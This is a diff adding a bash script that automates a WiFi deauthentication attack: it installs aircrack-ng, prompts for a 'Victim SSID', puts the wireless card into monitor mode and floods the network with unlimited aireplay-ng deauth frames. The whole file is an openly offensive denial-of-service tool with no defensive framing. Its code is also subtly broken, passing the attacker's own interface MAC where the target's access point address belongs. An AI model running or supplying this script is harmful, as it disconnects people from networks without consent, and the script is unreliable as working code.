@@ -1,0 +1,55 @@
+#!/bin/bash
+# Deauth WiFi hotspot
+for cmd in aircrack-ng fzf; do
+    if ! command -v $cmd &> /dev/null; then
+        yes '' | yay --needed --noconfirm $cmd
+    fi
+done
+fzf_splitted() {
+    if [[ -n "$TMUX" ]]; then
+        fzf --color=16 --reverse --ansi "$@"
+    else
+        fzf-tmux --color=16 -x --height ${FZF_TMUX_HEIGHT:-40%} --reverse --cycle --ansi "$@"
+    fi
+}
+# Select the active network device using fzf_splitted
+device=$(ip link | awk '/state UP/ {print substr($2, 1, length($2)-1)}' | fzf_splitted --prompt="Select Network Device: ") || {
+    echo "No device selected."
+    exit 1
+}
+# Get the MAC address of the selected device
+mac=$(ip link show "$device" | awk '/ether/ {print $2}') || {
+    echo "Failed to get MAC address for device $device."
+    exit 1
+}
+# Scan for SSIDs using iwlist and select SSID using fzf_splitted
+sudo ip link set "$device" up
+ssids=$(sudo iwlist "$device" scanning | grep 'ESSID' | awk -F: '{print $2}' | tr -d '"' | fzf_splitted --prompt="Select Victim SSID: ") || {
+    echo "No SSID selected."
+    exit 1
+}
+# Find the channel of the SSID
+channel=$(sudo iwlist "$device" scanning | grep -A 10 "$ssids" | grep 'Channel:' | awk -F ':' '{print $2}' | head -n 1) || {
+    echo "Could not determine the channel for SSID $ssids."
+    sudo ip link set "$device" down
+    sudo iw dev "$device" set type managed
+    sudo ip link set "$device" up
+    exit 1
+}
+# Put the device into monitor mode, set channel, and send deauth packets
+{
+    sudo ip link set "$device" down
+    sudo iw dev "$device" set type monitor
+    sudo ip link set "$device" up
+    sudo iw dev "$device" set channel "$channel"
+    sudo aireplay-ng --deauth 0 -a "$mac" -e "$ssids" --ignore-negative-one "$device"
+    sudo ip link set "$device" down
+    sudo iw dev "$device" set type managed
+    sudo ip link set "$device" up
+} || {
+    echo "Failed to perform deauth attack."
+    sudo ip link set "$device" down
+    sudo iw dev "$device" set type managed
+    sudo ip link set "$device" up
+    exit 1
+}
